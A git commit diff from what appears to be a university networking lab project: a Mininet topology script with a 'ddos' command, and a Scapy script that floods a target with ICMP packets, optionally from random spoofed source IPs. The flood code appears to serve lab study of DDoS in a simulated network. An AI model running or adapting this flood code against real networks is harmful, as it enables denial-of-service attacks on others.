603d693dc4267881605b6e0e96bf6e3af34dede0
None <None>
2023-12-08 07:26:29 -0800

    comments and cleanup

--- mininet-sim.py
+++ mininet-sim.py
@@ -1,8 +1,8 @@
 #!/usr/bin/env python
 
 """
-Create a network where different switches are connected to
-different controllers, by creating a custom Switch() subclass.
+Written by Sebastien Marleau and Prianna Rahman
+for Carleton University's SYSC4701 "Communications System Lab" course
 """
 
 from mininet.net import Mininet
@@ -19,6 +19,7 @@ from mininet.topo import Topo
 
 class CoolTopology(Topo):
     def build(self):
+        # See the topology
         parent_switch = self.addSwitch("s20")
 
         NUM_SWITCHES = 3
@@ -26,7 +27,11 @@ class CoolTopology(Topo):
         for s_ind in range(1, NUM_SWITCHES + 1):
             switch_ip = f"10.0.{s_ind}.100"
             switch_mac = f"00:0{s_ind}:00:00:00:00"
+            # The switch doesn't really have an IP address or mac, 
+            # we just make the hosts believe it does
             s = self.addSwitch(f"s{s_ind}")
+
+            # index 0 is for the switch, 1-N is for h1-hN
             ips = [""] * (NUM_HOSTS_PER_SWITCH + 1)
             macs = [""] * (NUM_HOSTS_PER_SWITCH + 1)
             ips[0] = switch_ip
@@ -34,20 +39,23 @@ class CoolTopology(Topo):
             for i in range(1, NUM_HOSTS_PER_SWITCH + 1):
                 ips[i] = f"10.0.{s_ind}.{i}"
                 macs[i] = f"00:0{s_ind}:00:00:00:0{i}"
+            
             for i in range(1, NUM_HOSTS_PER_SWITCH + 1):
+                # for s1: h1-h3, for s2: h4-h6, etc.
+                host_num = NUM_HOSTS_PER_SWITCH * (s_ind-1) + i
                 h = self.addHost(
-                    f"h{NUM_HOSTS_PER_SWITCH * (s_ind-1) + i}",
+                    f"h{host_num}",
                     ip=f"{ips[i]}/24",
                     defaultRoute=f"via {switch_ip}",
                     mac=macs[i],
                     arp=zip(ips, macs),
                 )
-                # 1Mbps rate from host to switch
+                # 0.1Mbps rate from host to switch
                 self.addLink(h, s, port2=i, bw=0.1, delay="50ms")
 
             self.addLink(s, parent_switch)
 
-        s_ind = NUM_SWITCHES + 1
+        s_ind = NUM_SWITCHES + 1 #switch 4 connected to only the server
         switch_ip = f"10.0.{s_ind}.100"
         switch_mac = f"00:0{s_ind}:00:00:00:00"
         server_switch = self.addSwitch(f"s{s_ind}")
@@ -58,36 +66,29 @@ class CoolTopology(Topo):
             arp=[(switch_ip, switch_mac)],
             mac=f"00:0{s_ind}:00:00:00:01",
         )
-        # 3Mbps
+        # 0.3Mbps
         self.addLink(server, server_switch, bw=0.3, delay="50ms")
         self.addLink(server_switch, parent_switch)
 
 
 class CoolHost(Host):
+    # This overrides the function in Host
+    # adds arps configured in the topology to the hosts when net.build() is called
     def config(self, mac=None, ip=None, defaultRoute=None, lo="up", **_params):
-        """Configure Node according to (optional) parameters:
-        mac: MAC address for default interface
-        ip: IP address for default interface
-        ifconfig: arbitrary interface configuration
-        Subclasses should override this method and call
-        the parent class's config(**params)"""
-        # If we were overriding this method, we would call
-        # the superclass config method here as follows:
         r = super().config(mac, ip, defaultRoute, lo, **_params)
-        # self.setIP(ip=ip, prefixLen=self.params["ip_prefix"])
-        # print([a for a in self.params["arp"]])
         for ip, mac in self.params["arp"]:
             self.setARP(ip=ip, mac=mac)
         return r
 
 
 class CoolCLI(CLI):
+    # This adds a new command to the mininet CLI, 'ddos'
     def do_ddos(self, line):
         args = line.split()
-        mode = args[0]
-        ip = args[1]
+        mode = args[0] # 'normal' or 'spoof'
+        ip = args[1] # either a host name such as 'h1' or 'server', or an IP address
         if ip in self.mn:
-            ip = self.mn[ip].defaultIntf().updateIP()
+            ip = self.mn[ip].defaultIntf().updateIP() # convert hostname to IP address
 
         hosts = args[2:]
         for host_name in hosts:
@@ -100,18 +101,18 @@ class CoolCLI(CLI):
                 host_ip = host.defaultIntf().updateIP()
                 host.sendCmd(f"python3 packet_flood_ip_spoofing.py {host_ip} {ip}")
             else:
-                print("errors! use 'spoof' or 'normal'")
+                print("error! use 'spoof' or 'normal'")
 
 
 controller = RemoteController("controller", port=6653)
 
 net = Mininet(
-    topo=CoolTopology(),
-    host=CoolHost,
+    topo=CoolTopology(), # Topology from 'topology-diagram.png'
+    host=CoolHost, # Sets arps on build
     switch=OVSSwitch,
-    link=TCLink,
+    link=TCLink, # Allows the rate limiting and delay in links from the topology
     build=False,
-    waitConnected=True,
+    waitConnected=True, # Waits until all switches connect to the controller
     autoSetMacs=True,
     controller=RemoteController,
 )
@@ -121,6 +122,5 @@ net.build()
 net.start()
 
 CoolCLI(net)
-# net.hosts[0].cmd()
 
 net.stop()
--- packet_flood_ip_spoofing.py
+++ packet_flood_ip_spoofing.py
@@ -1,28 +1,30 @@
 #!/usr/bin/env python
+"""
+Written by Sebastien Marleau and Prianna Rahman
+for Carleton University's SYSC4701 "Communications System Lab" course
+"""
+
 from time import sleep
 from scapy.all import IP, ICMP, sendp, RandIP, Ether, conf
 import sys
-import random
 
+src_ip = sys.argv[1]
+dst_ip = sys.argv[2]
 
-if __name__ == "__main__":
-    src_ip = sys.argv[1]
-    dst_ip = sys.argv[2]
+if src_ip == "spoof":
+    src_ip = RandIP()
 
-    if src_ip == "spoof":
-        src_ip = RandIP()
+socket = conf.L2socket()
+packet = (
+    Ether(src="ff:ff:ff:ff:ff:ff", dst="ff:ff:ff:ff:ff:ff") #Ethernet doesn't matter with this topology
+    / IP(src=src_ip, dst=dst_ip)
+    / ICMP()
+)
+size_bits = len(bytes(packet)) * 8
+target_mbps = 0.1
+every_x_seconds = size_bits / (target_mbps * 1e6)
+print(size_bits, target_mbps, every_x_seconds)
 
-    socket = conf.L2socket()
-    packet = (
-        Ether(src="ff:ff:ff:ff:ff:ff", dst="ff:ff:ff:ff:ff:ff")
-        / IP(src=src_ip, dst=dst_ip)
-        / ICMP()
-    )
-    size_bits = len(bytes(packet)) * 8
-    target_mbps = 0.1
-    every_x_seconds = size_bits / (target_mbps * 1e6)
-    print(size_bits, target_mbps, every_x_seconds)
-
-    while True:
-        sendp(packet, socket=socket, verbose=0)
-        sleep(every_x_seconds)
+while True:
+    sendp(packet, socket=socket, verbose=0)
+    sleep(every_x_seconds)
